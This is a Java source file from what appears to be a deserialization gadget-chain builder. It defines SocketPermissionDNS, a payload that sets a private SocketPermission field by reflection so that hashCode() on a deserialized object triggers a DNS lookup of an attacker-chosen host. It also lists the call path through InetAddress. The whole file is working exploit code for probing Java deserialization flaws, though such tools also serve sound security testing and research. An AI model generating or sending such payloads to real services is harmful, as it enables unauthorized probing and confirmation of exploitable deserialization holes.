package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.net.*;

@Dependencies()
@Authors({ Authors.YihengZhang })
@Impact(Impact.DNSLookup)
public class SocketPermissionDNS extends GadgetChain<HashCodeTrampoline> {

    public SocketPermissionDNS(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        SocketPermission permission = new SocketPermission(command, "connect");
        Reflections.setFieldValue(permission, "init_with_ip", true);
        return new TrampolineConnector(permission);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return  " <java.net.SocketPermission: int hashCode()>\n" +
                " <java.net.SocketPermission: void getCanonName()>\n" +
                " <java.net.SocketPermission: void getIP()>\n" +
                " <java.net.InetAddress: java.net.InetAddress[] getAllByName0(java.lang.String,boolean)>\n" +
                " <java.net.InetAddress: java.net.InetAddress[] getAllByName0(java.lang.String,java.net.InetAddress,boolean)>";
    }
}
